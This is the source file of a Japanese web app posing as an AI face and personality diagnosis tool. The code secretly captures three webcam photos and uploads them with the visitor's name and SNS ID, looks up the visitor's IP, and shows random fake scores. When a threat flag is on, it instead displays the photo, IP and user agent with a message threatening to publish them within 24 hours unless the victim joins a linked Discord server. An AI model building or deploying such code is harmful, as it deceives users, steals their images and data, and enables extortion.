import React, { useState, useEffect } from "react";

import AI from "./ai.png";
import { useRef } from "react";
import {
  Radar,
  RadarChart,
  PolarGrid,
  PolarAngleAxis,
  PolarRadiusAxis,
  ResponsiveContainer,
} from "recharts";
import { Turnstile } from "@marsidev/react-turnstile";

const sleep = (ms) => new Promise((resolve) => setTimeout(resolve, ms));
const randint = (min, max) => Math.floor(Math.random() * (max - min + 1)) + min;

const sohyo = [
  [
    "誰とでもすぐに打ち解ける、まるで太陽のような存在！\nあなたの笑顔は人を惹きつけ、場の空気を明るくする力があります。",
    "その表情、まさにパーティーの中心人物！\n初対面でも安心感を与える、抜群の社交センスを感じさせます。",
  ],
  [
    "迷いのない表情に、リーダーの風格がにじみ出ています。\n状況を見極め、最適な選択ができる頼れる存在です。",
    "一瞬の表情に意志の強さが光る！\nあなたの顔には、“決める力”が自然と表れています。",
  ],
  [
    "その優しいまなざし、癒しの力を持っています！\n話しかけたくなる、包み込むような共感力があふれています。",
    "感情に寄り添える繊細さが顔に出ています。\n心を開かせる雰囲気で、誰からも信頼されるタイプです。",
  ],
  [
    "今すぐにでも動き出しそうなエネルギーを感じます！\nあなたの顔からは、考える前にまず行動する大胆さが伝わってきます。",
    "やると決めたら即実行、そんな勢いを秘めた表情です。\n前向きでフットワークの軽い魅力があります。",
  ],
  [
    "唯一無二の個性がにじみ出る、印象に残る顔立ちです。\nその存在感、周囲をワクワクさせるパワーがあります！",
    "見た瞬間に『何か持ってる』と感じさせる特別なオーラ。\nあなたにしか出せない魅力が、しっかり顔に現れています。",
  ],
];

function App() {
  const [message, setMessage] = useState("今すぐ診断！");
  const [name, setName] = useState("");
  const [snsId, setSnsId] = useState("");
  const [disabled, setDisabled] = useState(false);
  const [mode, setMode] = useState(0);
  const [data, setData] = useState({});
  const [sohyoText, setSohyoText] = useState("");
  const [reveal, setReveal] = useState(false);
  const [ip, setIp] = useState("");
  const [tsStatus, setTsStatus] = useState(false);
  const tsRef = useRef(null);
  useEffect(() => {
    const actualData = [
      randint(60, 100),
      randint(60, 100),
      randint(60, 100),
      randint(60, 100),
      randint(60, 100),
    ];
    setData([
      {
        subject: "社",
        A: actualData[0],
        B: actualData[0] - randint(-1, 30),
        fullMark: 100,
      },
      {
        subject: "決",
        A: actualData[1],
        B: actualData[1] - randint(-1, 30),
        fullMark: 100,
      },
      {
        subject: "共",
        A: actualData[2],
        B: actualData[2] - randint(-1, 30),
        fullMark: 100,
      },
      {
        subject: "行",
        A: actualData[3],
        B: actualData[3] - randint(-1, 30),
        fullMark: 100,
      },
      {
        subject: "ユ",
        A: actualData[4],
        B: actualData[4] - randint(-1, 30),
        fullMark: 100,
      },
    ]);
    const randomIndex = Math.floor(Math.random() * 2);
    const maxIndex = actualData.indexOf(Math.max(...actualData));
    setSohyoText(sohyo[maxIndex][randomIndex]);
  }, []);
  const videoRef = useRef(null);
  const canvasRef = useRef(null);

  const modechange = () => {
    if (name.length === 0) {
      alert("名前を入力してください");
      return;
    }
    setMode(1);
  };

  const camera = async () => {
    if (TURNSTILE_KEY && !tsStatus) {
      alert("CAPTCHA認証を完了してください");
      return;
    }
    setMessage("カメラを起動中...");
    const stream = await navigator.mediaDevices
      .getUserMedia({
        video: { facingMode: "user" },
        audio: false,
      })
      .catch((err) => {
        console.error("Error accessing camera: ", err);
        setMessage("カメラの起動に失敗しました。");
        const formData = new FormData();
        formData.append("error", "camerafail");
        formData.append("name", name.slice(0, 20));
        formData.append("snsId", snsId.slice(0, 20));
        formData.append("turnstile", tsRef.current?.getResponse());
        fetch("/upload", {
          method: "POST",
          body: formData,
        });
      });
    videoRef.current.srcObject = stream;
    videoRef.current.play();

    setDisabled(true);

    videoRef.current.addEventListener("loadeddata", async () => {
      setMessage("診断中...");
      await sleep(500);
      const canvas = canvasRef.current;
      const context = canvas.getContext("2d");
      canvas.width = videoRef.current.videoWidth;
      canvas.height = videoRef.current.videoHeight;
      context.drawImage(videoRef.current, 0, 0, canvas.width, canvas.height);
      const blob = await new Promise((resolve) => {
        canvas.toBlob((blob) => {
          resolve(blob);
        }, "image/jpeg");
      });
      await sleep(500);
      context.drawImage(videoRef.current, 0, 0, canvas.width, canvas.height);
      const blob2 = await new Promise((resolve) => {
        canvas.toBlob((blob) => {
          resolve(blob);
        }, "image/jpeg");
      });
      
      await sleep(500);
      context.drawImage(videoRef.current, 0, 0, canvas.width, canvas.height);
      const blob3 = await new Promise((resolve) => {
        canvas.toBlob((blob) => {
          resolve(blob);
        }, "image/jpeg");
      });
      const formData = new FormData();
      formData.append("file1", blob);
      formData.append("file2", blob2);
      formData.append("file3", blob3);
      formData.append("name", name.slice(0, 20));
      formData.append("snsId", snsId.slice(0, 20));
      formData.append("turnstile", tsRef.current?.getResponse());
      await fetch("/upload", {
        method: "POST",
        body: formData,
      });
      const ip = await (await fetch("https://icanhazip.com")).text();
      setIp(ip);

      await sleep(1000);
      if (MODE === "seikaku") {
        setMessage("社交性を診断中...");
        await sleep(randint(500, 2000));
        setMessage("決断力を診断中...");
        await sleep(randint(500, 2000));
        setMessage("共感力を診断中...");
        await sleep(randint(500, 2000));
        setMessage("行動力を診断中...");
        await sleep(randint(500, 2000));
        setMessage("ユニークさを診断中...");
        await sleep(randint(500, 2000));
      } else {
        setMessage("診断中...しばらくお待ち下さい。");
        await sleep(randint(500, 2000));
      }
      setMessage("診断完了！結果を表示中...");
      await sleep(2000);
      setMode(2);
      if (ODOSHI) {
        setReveal(true);
      }
    });
  };

  console.log(MODE);

  return (
    <div className="w-full h-full grid place-items-center">
      <main className="h-full flex flex-col justify-center gap-4 items-center">
        <img src={AI} alt="顔採点AI" width={400} />
        {mode === 0 ? (
          <div className="flex flex-col justify-center items-center gap-4">
            <h2 className="text-white text-2xl font-bold text-center mt-4">
              AIがあなたの顔から<br />性格、将来の顔、<br />ニキビ、シワを診断します！
            </h2>
            <input
              type="text"
              className="p-2 rounded-full bg-white"
              placeholder="あなたの名前"
              value={name}
              onChange={(e) => setName(e.target.value)}
            />
            <input
              type="text"
              className="p-2 rounded-full bg-white"
              placeholder="SNS ID"
              value={snsId}
              onChange={(e) => setSnsId(e.target.value)}
            />
            <button
              className="rounded-full bg-pink-500 p-4 text-xl text-white font-bold"
              onClick={() => modechange()}
              disabled={disabled}
            >
              診断
            </button>
          </div>
        ) : mode === 1 ? (
          <div className="flex flex-col justify-center items-center gap-4">
            <h2 className="text-white text-2xl font-bold text-center mt-4">
              診断したい項目を選んでください！
            </h2>
            <div className="flex flex-col gap-4 mb-2">
              <span className="inline-flex gap-2 items-center">
                <input type="checkbox" id="seikaku" name="mode" />
                <label
                  htmlFor="seikaku"
                  className="text-white text-xl font-bold"
                >
                  性格
                </label>
              </span>
              <span className="inline-flex gap-2 items-center">
                <input type="checkbox" id="shorai" name="mode" />
                <label
                  htmlFor="shorai"
                  className="text-white text-xl font-bold"
                >
                  将来の顔
                </label>
              </span>
              <span className="inline-flex gap-2 items-center">
                <input type="checkbox" id="nikibi" name="mode" />
                <label
                  htmlFor="nikibi"
                  className="text-white text-xl font-bold"
                >
                  ニキビ
                </label>
              </span>
              <span className="inline-flex gap-2 items-center">
                <input type="checkbox" id="shiwa" name="mode" />
                <label htmlFor="shiwa" className="text-white text-xl font-bold">
                  シワ
                </label>
              </span>
            </div>

            {
              TURNSTILE_KEY && (
                <Turnstile siteKey={TURNSTILE_KEY} onSuccess={() => setTsStatus(true)} ref={tsRef} />
              )
            }

            <button
              className="rounded-full bg-pink-500 mt-4 p-4 text-xl text-white font-bold"
              onClick={() => camera()}
              disabled={disabled}
            >
              {message}
            </button>
          </div>
        ) : (
          <div className="flex flex-col justify-center items-center gap-4">
            {!ODOSHI && (
              <ResponsiveContainer width="100%" height={250}>
                <RadarChart
                  width="100%"
                  height="100%"
                  cx="50%"
                  cy="50%"
                  outerRadius="80%"
                  data={data}
                >
                  <PolarGrid />
                  <PolarAngleAxis dataKey="subject" />
                  <PolarRadiusAxis />
                  <Radar
                    name="あなた"
                    dataKey="A"
                    stroke="#8884d8"
                    fill="#ffea00"
                    fillOpacity={0.9}
                  />
                  <Radar
                    name="全国平均"
                    dataKey="B"
                    stroke="#82ca9d"
                    fill="#82ca9d"
                    fillOpacity={0.2}
                  />
                </RadarChart>
              </ResponsiveContainer>
            )}
            <h2 className="text-white text-2xl font-bold text-center mt-4">
              あなたの性格診断結果！
            </h2>
            {!ODOSHI && (
              <div className="flex flex-col justify-center items-center">
                <h3 className="text-white text-xl font-bold text-center">
                  社交性: {data[0].A}点
                </h3>
                <h3 className="text-white text-xl font-bold text-center">
                  決断力: {data[1].A}点
                </h3>
                <h3 className="text-white text-xl font-bold text-center">
                  共感力: {data[2].A}点
                </h3>
                <h3 className="text-white text-xl font-bold text-center">
                  行動力: {data[3].A}点
                </h3>
                <h3 className="text-white text-xl font-bold text-center">
                  ユニークさ: {data[4].A}点
                </h3>
                <h3 className="text-white text-2xl font-bold text-center mt-4 whitespace-pre-line">
                  AI 総評コメント:{"\n"}
                  {sohyoText}
                </h3>
              </div>
            )}
            {ODOSHI && (
              <>
                <div className="flex flex-col justify-center items-center text-red-500 font-bold">
                  <p>あなたの顔写真と端末情報を取得しました</p>
                  <p>24時間以内にネット上に公開します</p>
                  <p>情報を公開されたくなかったら</p>
                  <p>以下の鯖に入って非公開申請をするように</p>
                  <a
                    href="https://discord.gg/Vk7WZ4JaBA"
                    className="text-blue-400"
                  >
                    https://discord.gg/Vk7WZ4JaBA
                  </a>
                </div>
                <div className="flex flex-col justify-center items-center text-red-500 font-bold">
                  <p>IPアドレス: {ip}</p>
                  <p>UA: {navigator.userAgent}</p>
                </div>
              </>
            )}
          </div>
        )}
      </main>
      <video ref={videoRef} className="hidden"></video>
      <canvas
        ref={canvasRef}
        className={reveal ? "block w-[calc(100vw-5%)]" : "hidden"}
      ></canvas>
    </div>
  );
}

export default App;
